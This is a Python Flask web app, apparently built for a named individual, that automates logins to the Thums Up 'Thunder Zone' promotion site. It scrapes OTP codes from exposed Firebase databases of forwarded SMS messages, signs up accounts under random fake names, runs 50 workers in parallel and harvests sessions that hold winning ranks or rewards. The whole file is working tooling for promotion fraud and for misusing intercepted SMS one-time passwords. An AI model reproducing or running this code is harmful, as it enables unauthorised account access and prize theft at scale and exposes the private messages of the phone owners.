"""
===================================================================================
FIREBASE AUTOMATED SESSION EXTRACTOR & WINNER HARVESTER (50 WORKERS)
-----------------------------------------------------------------------------------
CREATED WITH LOVE FOR HIMANSHU KUMAR BY ONYX v67
===================================================================================
"""

import os
import sys
import json
import time
import re
import glob
import random
import queue
from typing import Optional, Tuple, Dict, List
from concurrent.futures import ThreadPoolExecutor, as_completed

from flask import Flask, render_template_string, request, jsonify, Response, send_file

if sys.platform == "win32":
    try:
        sys.stdout.reconfigure(encoding="utf-8", errors="replace", line_buffering=True)
        sys.stderr.reconfigure(encoding="utf-8", errors="replace", line_buffering=True)
    except Exception:
        pass

import requests

BASE_URL = "https://thunder-zone.coke2home.com"
REDEMPTION_LINK = "https://gullylabs.com/collections/thumsup-x-gully-labs"
HERE = os.path.dirname(os.path.abspath(__file__))
DEV_INDEX_PATH = r"C:\Users\Himanshu Kumar\OneDrive\Desktop\stocks\device_index.json"

HEADERS = {
    "Content-Type": "application/json",
    "Accept": "application/json, text/plain, */*",
    "Accept-Language": "en-US,en;q=0.9",
    "Origin": BASE_URL,
    "Referer": f"{BASE_URL}/game",
    "User-Agent": "Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
}

app = Flask(__name__)

LATEST_INSPECTED_DEVICES = []

def get_device_map() -> Dict:
    if os.path.exists(DEV_INDEX_PATH):
        try:
            return json.load(open(DEV_INDEX_PATH, encoding="utf-8"))
        except Exception:
            pass
    return {}

def fetch_firebase_otp(panel_url: str, client_id: str, existing_keys: Optional[set] = None, min_ts: int = 0, timeout_sec: int = 22) -> Optional[str]:
    if not panel_url or not client_id:
        return None
    
    purl = panel_url.rstrip('/')
    endpoints = [
        f"{purl}/messages/{client_id}.json",
        f"{purl}/clients/{client_id}/sms.json"
    ]
    
    start_time = time.time()
    cutoff_ts = max(0, min_ts - 60000)

    # Fast polling loop with 0.8s interval
    while time.time() - start_time < timeout_sec:
        for url in endpoints:
            try:
                r = requests.get(url, timeout=3)
                if r.status_code == 200 and r.json():
                    msgs = r.json()
                    if isinstance(msgs, dict):
                        sorted_keys = sorted(
                            msgs.keys(),
                            key=lambda k: int(k) if str(k).isdigit() else 0,
                            reverse=True
                        )
                        for k in sorted_keys:
                            mdata = msgs[k]
                            if not isinstance(mdata, dict):
                                continue

                            if str(k).isdigit() and len(str(k)) >= 12:
                                k_num = int(k)
                                if cutoff_ts > 0 and k_num < cutoff_ts:
                                    continue
                            elif existing_keys is not None and k in existing_keys:
                                continue

                            sender = str(mdata.get("sender") or "").upper()
                            txt = str(mdata.get("body") or mdata.get("message") or mdata.get("text") or "")

                            is_thums = any(w in sender for w in ("THMSUP", "THUMSUP", "COKE", "C2H")) or \
                                       any(w in txt.lower() for w in ("thums up", "thunder zone", "thunder trail", "coke2home"))

                            if is_thums or ("otp" in txt.lower() and not any(w in txt.lower() for w in ("fetch", "phonepe", "swiggy", "zomato", "bank", "icici", "hdfc", "sbi", "airtel"))):
                                m = re.search(r"(?:One Time Password|OTP|code is)\s*[:\-]?\s*(\d{6})", txt, re.IGNORECASE)
                                if m:
                                    return m.group(1)
                                m2 = re.search(r"\b(\d{6})\b", txt)
                                if m2:
                                    return m2.group(1)
            except Exception:
                pass
        time.sleep(0.8)
    return None

class FirebaseSessionExtractor:
    def __init__(self, phone: str, panel_url: str, client_id: str):
        self.phone = "".join(c for c in str(phone) if c.isdigit())[-10:]
        self.panel_url = panel_url.rstrip('/') if panel_url else ""
        self.client_id = client_id
        self.session_file = os.path.join(HERE, f".session_{self.phone}.json")
        self.s = requests.Session()
        self.s.headers.update(HEADERS)

    def api(self, method: str, path: str, body: dict = None) -> requests.Response:
        for i in range(2):
            try:
                r = self.s.request(method, BASE_URL + path, json=body, timeout=10)
                if r.status_code == 401 and i == 0 and "/auth/" not in path:
                    try:
                        ref = self.s.post(BASE_URL + "/api/auth/refresh", timeout=6)
                        if ref.status_code == 200:
                            self.save_session()
                    except Exception:
                        pass
                    time.sleep(0.3)
                    continue
                return r
            except Exception:
                if i == 1:
                    raise
                time.sleep(0.4)
        return r

    def save_session(self):
        try:
            with open(self.session_file, "w", encoding="utf-8") as f:
                json.dump([{"name": c.name, "value": c.value} for c in self.s.cookies], f, indent=2)
        except Exception:
            pass

    def create_session(self) -> Tuple[str, str]:
        if not self.panel_url or not self.client_id:
            return "MISSING_INFO", "Panel URL or Client ID missing"

        existing_keys = set()
        endpoints = [
            f"{self.panel_url}/messages/{self.client_id}.json?shallow=true",
            f"{self.panel_url}/clients/{self.client_id}/sms.json?shallow=true"
        ]
        for ep in endpoints:
            try:
                snap = requests.get(ep, timeout=3)
                if snap.status_code == 200 and isinstance(snap.json(), dict):
                    existing_keys.update(snap.json().keys())
            except Exception:
                pass

        start_time_ms = int(time.time() * 1000)

        # 1. Send OTP
        try:
            r = self.api("POST", "/api/auth/send-otp", {"phone_number": self.phone})
            if r.status_code == 403:
                return "BLOCKED", "Account blocked on Thunder Zone (Clause 6)"
            if r.status_code == 429:
                return "RATE_LIMIT", "Rate limited on OTP send (HTTP 429)"
            if r.status_code != 200:
                return "FAILED", f"OTP send failed (HTTP {r.status_code})"
        except Exception as e:
            return "ERROR", f"Network error: {e}"

        # 2. Fetch OTP from Firebase
        otp = fetch_firebase_otp(self.panel_url, self.client_id, existing_keys=existing_keys, min_ts=start_time_ms, timeout_sec=22)
        if not otp:
            return "NO_OTP", "OTP not received in Firebase inbox (Timeout)"

        # 3. Verify OTP & Exchange Token
        time.sleep(0.2)
        try:
            vr = self.api("POST", "/api/auth/verify-otp", {"phone_number": self.phone, "otp": otp})
            if vr.status_code != 200:
                return "FAILED", f"OTP verify failed (HTTP {vr.status_code})"

            v = vr.json()
            ott = v.get("one_time_token") or (v.get("data") or {}).get("one_time_token")

            if v.get("requiresSignup") or (v.get("data") or {}).get("requiresSignup"):
                names = ["Rahul", "Rohan", "Priya", "Amit", "Neha", "Vikram", "Sneha", "Karan", "Pooja", "Arjun", "Kavya", "Suresh"]
                random_name = random.choice(names) + str(random.randint(100, 999))
                try:
                    self.api("POST", "/api/auth/signup", {
                        "one_time_token": ott,
                        "phone_number": self.phone,
                        "name": random_name
                    })
                except Exception:
                    pass

            if ott:
                time.sleep(0.2)
                self.api("POST", "/api/auth/validate-token", {"one_time_token": ott})
                time.sleep(0.2)
                self.api("POST", "/api/auth/exchange-token", {"one_time_token": ott})

            self.save_session()
            return "SUCCESS", "Session created successfully"
        except Exception as e:
            return "ERROR", f"Verification error: {e}"

def inspect_firebase_panel(panel_url: str) -> List[Dict]:
    purl = panel_url.rstrip('/')
    devices = []
    
    test_urls = [
        f"{purl}/clients.json",
        f"{purl}/messages.json",
        f"{purl}/.json"
    ]
    
    data = None
    for url in test_urls:
        try:
            r = requests.get(url, timeout=5)
            if r.status_code == 200 and r.json():
                data = r.json()
                break
        except Exception:
            pass

    if not data or not isinstance(data, dict):
        return devices

    if "clients" in data and isinstance(data["clients"], dict):
        client_node = data["clients"]
        for cid, info in client_node.items():
            phone = str(info.get("phone") or info.get("mobile") or info.get("phoneNumber") or cid)
            sms_data = info.get("sms") or info.get("messages") or {}
            is_active = len(sms_data) > 0 if isinstance(sms_data, (dict, list)) else True
            devices.append({
                "phone": phone,
                "client_id": cid,
                "panel_url": purl,
                "active": is_active,
                "sms_count": len(sms_data) if isinstance(sms_data, (dict, list)) else 0
            })
    elif "messages" in data and isinstance(data["messages"], dict):
        msg_node = data["messages"]
        for cid, msgs in msg_node.items():
            is_active = len(msgs) > 0 if isinstance(msgs, (dict, list)) else True
            devices.append({
                "phone": cid,
                "client_id": cid,
                "panel_url": purl,
                "active": is_active,
                "sms_count": len(msgs) if isinstance(msgs, (dict, list)) else 0
            })
    else:
        for k, val in data.items():
            if isinstance(val, dict):
                sms_count = len(val.get("sms") or val.get("messages") or {})
                devices.append({
                    "phone": k,
                    "client_id": k,
                    "panel_url": purl,
                    "active": sms_count > 0 or len(val) > 0,
                    "sms_count": sms_count
                })

    return devices

def audit_session_file(session_file: str, device_map: Dict) -> Dict:
    phone = os.path.basename(session_file).replace(".session_", "").replace(".json", "")
    dev_info = device_map.get(phone, {})
    device_id = dev_info.get("client_id") or "N/A"
    firebase_url = dev_info.get("panel_url") or "N/A"

    res = {
        "phone": phone,
        "status": "UNKNOWN",
        "rank": None,
        "score": 0,
        "username": "N/A",
        "is_winner": False,
        "has_rewards": False,
        "rewards": [],
        "banned": False,
        "device_id": device_id,
        "firebase_url": firebase_url,
        "details": ""
    }

    try:
        cookies = json.load(open(session_file, encoding="utf-8"))
        if not cookies:
            res["status"] = "INVALID"
            res["details"] = "Empty session file"
            return res

        cookie_dict = {c["name"]: c["value"] for c in cookies if isinstance(c, dict) and "name" in c and "value" in c}
        s = requests.Session()
        s.headers.update(HEADERS)
        for k, v in cookie_dict.items():
            s.cookies.set(k, v)

        # 1. Fetch /me info
        r = s.get(BASE_URL + "/api/thunder-trail/me", timeout=5)
        if r.status_code == 401:
            ref = s.post(BASE_URL + "/api/auth/refresh", timeout=5)
            if ref.status_code == 200:
                r = s.get(BASE_URL + "/api/thunder-trail/me", timeout=5)

        if r.status_code == 403:
            res["status"] = "BANNED"
            res["banned"] = True
            res["details"] = "Account banned / blacklisted on Thunder Zone (Clause 6)"
            return res

        if r.status_code == 200:
            me_data = r.json().get("data", {})
            res["status"] = "ACTIVE"
            res["username"] = me_data.get("username", "N/A")
            res["score"] = me_data.get("best_score", 0)
            res["rank"] = me_data.get("rank")
            res["is_winner"] = me_data.get("is_winner", False)

            # 2. Fetch /my-rewards info
            r_rew = s.get(BASE_URL + "/api/thunder-trail/my-rewards", timeout=5)
            if r_rew.status_code == 200:
                rew_data = r_rew.json().get("data", {})
                res["has_rewards"] = rew_data.get("has_rewards", False)
                res["rewards"] = rew_data.get("rewards", [])

            res["details"] = f"Active | Score: {res['score']} | Rank: #{res['rank']}"
        else:
            res["status"] = "EXPIRED"
            res["details"] = f"Session expired (HTTP {r.status_code})"

    except Exception as e:
        res["status"] = "ERROR"
        res["details"] = str(e)

    return res

@app.route('/')
def index():
    return send_file(os.path.join(HERE, "index.html"))

@app.route('/api/inspect', methods=['POST'])
def api_inspect():
    global LATEST_INSPECTED_DEVICES
    data = request.json or {}
    use_index = data.get("use_index")
    urls = data.get("urls", [])

    devices = []
    if use_index and os.path.exists(DEV_INDEX_PATH):
        try:
            dev_map = json.load(open(DEV_INDEX_PATH, encoding="utf-8"))
            for phone, info in dev_map.items():
                purl = info.get("panel_url")
                cid = info.get("client_id")
                if purl and cid:
                    devices.append({
                        "phone": phone,
                        "client_id": cid,
                        "panel_url": purl,
                        "active": True
                    })
        except Exception:
            pass
    elif urls:
        with ThreadPoolExecutor(max_workers=20) as ex:
            futures = [ex.submit(inspect_firebase_panel, url) for url in urls]
            for f in as_completed(futures):
                devices.extend(f.result())

    total = len(devices)
    active = len([d for d in devices if d.get("active", True)])
    inactive = total - active

    LATEST_INSPECTED_DEVICES = devices
    return jsonify({
        "total": total,
        "active": active,
        "inactive": inactive,
        "devices": devices
    })

def process_device_task(dev):
    phone = dev.get("phone", "N/A")
    purl = dev.get("panel_url", "")
    cid = dev.get("client_id", "")
    extractor = FirebaseSessionExtractor(phone, purl, cid)
    code, msg = extractor.create_session()
    return extractor.phone, code, msg

@app.route('/api/stream_extraction')
def api_stream_extraction():
    global LATEST_INSPECTED_DEVICES
    devices = [d for d in LATEST_INSPECTED_DEVICES if d.get("active", True)]

    def generate():
        total = len(devices)
        if total == 0:
            yield "data: " + json.dumps({"type": "complete"}) + "\n\n"
            return

        completed_count = 0
        event_q = queue.Queue()

        def worker_task(dev):
            nonlocal completed_count
            phone, code, msg = process_device_task(dev)
            completed_count += 1
            progress = int((completed_count / total) * 100)
            event_q.put({
                "type": "log",
                "phone": phone,
                "code": code,
                "msg": msg,
                "progress": progress
            })

        executor = ThreadPoolExecutor(max_workers=50)
        futures = [executor.submit(worker_task, dev) for dev in devices]

        while completed_count < total or not event_q.empty():
            try:
                item = event_q.get(timeout=0.1)
                yield f"data: {json.dumps(item)}\n\n"
            except queue.Empty:
                pass

        executor.shutdown(wait=True)
        yield "data: " + json.dumps({"type": "complete"}) + "\n\n"

    return Response(generate(), mimetype='text/event-stream')

@app.route('/api/audit')
def api_audit():
    session_files = sorted(glob.glob(os.path.join(HERE, ".session_*.json")))
    results = []
    winners = []
    top22 = []
    clean_sessions = []

    if not session_files:
        return jsonify({"results": [], "winners": [], "top22": []})

    device_map = get_device_map()

    with ThreadPoolExecutor(max_workers=50) as ex:
        futures = {ex.submit(audit_session_file, sf, device_map): sf for sf in session_files}
        for f in as_completed(futures):
            res = f.result()
            results.append(res)
            
            if res["status"] == "ACTIVE":
                clean_sessions.append(res["phone"])

            # Check if Winner
            if res["is_winner"] or res["has_rewards"] or len(res["rewards"]) > 0:
                winners.append(res)

            # Check if Top 22 Leaderboard
            elif res["rank"] is not None and isinstance(res["rank"], int) and res["rank"] <= 22:
                top22.append(res)

    # Save summary JSON files on disk automatically
    try:
        json.dump(winners, open(os.path.join(HERE, "all_winners_found.json"), "w"), indent=2)
        json.dump(top22, open(os.path.join(HERE, "top22_leaderboard.json"), "w"), indent=2)
        json.dump(clean_sessions, open(os.path.join(HERE, "clean_valid_sessions.json"), "w"), indent=2)
    except Exception:
        pass

    return jsonify({
        "results": results,
        "winners": winners,
        "top22": top22,
        "clean_count": len(clean_sessions)
    })

@app.route('/api/export')
def api_export():
    export_type = request.args.get("type", "sessions")
    file_map = {
        "winners": "all_winners_found.json",
        "top22": "top22_leaderboard.json",
        "sessions": "clean_valid_sessions.json"
    }
    fname = file_map.get(export_type, "clean_valid_sessions.json")
    fpath = os.path.join(HERE, fname)
    if os.path.exists(fpath):
        return send_file(fpath, as_attachment=True)
    return jsonify({"error": "File not generated yet. Run audit first."}), 404

if __name__ == "__main__":
    print(f"\n⚡ Starting 50-Worker Turbo Winner Harvester Web App on http://127.0.0.1:5000 ...\n")
    app.run(host="0.0.0.0", port=5000, debug=False)
